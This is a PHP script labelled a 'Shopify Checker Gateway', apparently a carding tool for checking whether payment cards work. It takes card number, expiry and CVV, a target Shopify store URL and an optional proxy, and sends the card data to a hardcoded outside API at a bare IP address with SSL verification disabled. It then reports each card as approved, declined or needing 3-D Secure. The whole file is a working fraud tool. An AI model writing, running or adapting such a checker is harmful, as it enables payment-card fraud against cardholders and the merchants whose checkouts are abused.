<?php
// Shopify Checker Gateway
header('Content-Type: text/plain');

$card = $_POST['cc'] ?? $_GET['cc'] ?? '';
$url = $_POST['url'] ?? $_GET['url'] ?? '';
$amount = $_POST['amount'] ?? $_GET['amount'] ?? '8.7';
$proxy = $_POST['proxy'] ?? $_GET['proxy'] ?? '';

// Your working API endpoint
$apiEndpoint = 'http://108.165.12.183:8081';

if (empty($card)) {
    echo "ERROR: No card provided";
    exit;
}

if (empty($url)) {
    echo "ERROR: No Shopify URL provided";
    exit;
}

// Parse card details
$parts = explode('|', $card);
if (count($parts) < 4) {
    echo "DECLINED: Invalid card format. Use: number|month|year|cvv";
    exit;
}

list($cardNumber, $month, $year, $cvv) = $parts;
$cardNumber = trim($cardNumber);
$month = trim($month);
$year = trim($year);
$cvv = trim($cvv);

// Clean up year
if (strlen($year) == 2) {
    $year = '20' . $year;
}

// Format URL
$url = rtrim($url, '/');
if (!preg_match('/^https?:\/\//', $url)) {
    $url = 'https://' . $url;
}

// Extract shop name for display
$shopName = parse_url($url, PHP_URL_HOST);
$shopName = str_replace('www.', '', $shopName);

// Build the API URL
$apiUrl = $apiEndpoint . '/?cc=' . urlencode($card) . '&url=' . urlencode($url);

// Add proxy if provided
if (!empty($proxy)) {
    $apiUrl .= '&proxy=' . urlencode($proxy);
}

// Initialize CURL with longer timeout to wait for response
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 60); // 60 second timeout to wait for response
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept: application/json, text/plain, */*',
    'Connection: keep-alive'
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
$totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

// Check for CURL errors
if ($response === false || !empty($curlError)) {
    echo "DECLINED: Connection error - " . ($curlError ?: 'Failed to connect to API');
    exit;
}

// Check if we got a response
if (empty($response)) {
    echo "DECLINED: No response from API after " . round($totalTime, 2) . " seconds";
    exit;
}

// Try to parse JSON response
$result = json_decode($response, true);

// If JSON parsing failed, try to extract from text response
if ($result === null) {
    // Check for success indicators in text response
    if (strpos($response, 'Order completed') !== false || 
        strpos($response, 'APPROVED') !== false ||
        strpos($response, 'Success') !== false ||
        strpos($response, 'approved') !== false) {
        echo "APPROVED: Order completed";
        exit;
    } 
    elseif (strpos($response, 'DECLINED') !== false) {
        preg_match('/DECLINED:\s*(.+)/', $response, $matches);
        $reason = $matches[1] ?? 'Card declined';
        echo "DECLINED: " . $reason;
        exit;
    }
    elseif (strpos($response, '3DS') !== false || strpos($response, '3d secure') !== false) {
        echo "3DS: 3D Secure required";
        exit;
    }
    else {
        // Return the actual response if it's not empty
        $cleanResponse = trim($response);
        if (!empty($cleanResponse)) {
            echo "DECLINED: " . substr($cleanResponse, 0, 200);
        } else {
            echo "DECLINED: Empty response from gateway";
        }
        exit;
    }
}

// Process JSON response
if (isset($result['Response'])) {
    $responseText = $result['Response'];
    
    // Check for approved
    if (strpos($responseText, 'Order completed') !== false || 
        strpos($responseText, 'APPROVED') !== false ||
        strpos($responseText, 'approved') !== false) {
        echo "APPROVED: Order completed";
        exit;
    }
    // Check for 3DS
    elseif (strpos($responseText, '3DS') !== false || strpos($responseText, '3d secure') !== false) {
        echo "3DS: 3D Secure required";
        exit;
    }
    // Check for insufficient funds
    elseif (stripos($responseText, 'insufficient') !== false) {
        echo "DECLINED: Insufficient funds";
        exit;
    }
    // Check for expired card
    elseif (stripos($responseText, 'expired') !== false) {
        echo "DECLINED: Card expired";
        exit;
    }
    // Check for invalid CVV
    elseif (stripos($responseText, 'cvv') !== false) {
        echo "DECLINED: Invalid CVV";
        exit;
    }
    else {
        echo $responseText;
        exit;
    }
}

// Check for status field
if (isset($result['status'])) {
    $status = strtolower($result['status']);
    
    if ($status === 'success' || $status === 'approved') {
        $message = $result['message'] ?? 'Order completed';
        echo "APPROVED: " . $message;
        exit;
    } elseif ($status === '3ds') {
        echo "3DS: 3D Secure required";
        exit;
    } elseif ($status === 'insufficient') {
        echo "DECLINED: Insufficient funds";
        exit;
    } elseif ($status === 'declined') {
        $message = $result['message'] ?? 'Card declined';
        echo "DECLINED: " . $message;
        exit;
    }
}

// If we have a payment ID or transaction ID, consider approved
if (isset($result['payment_id']) || isset($result['transaction_id']) || isset($result['order_id'])) {
    echo "APPROVED: Order completed";
    exit;
}

// Default fallback - show what we received
if (!empty($response)) {
    echo "DECLINED: " . substr($response, 0, 200);
} else {
    echo "DECLINED: No valid response from gateway";
}
?>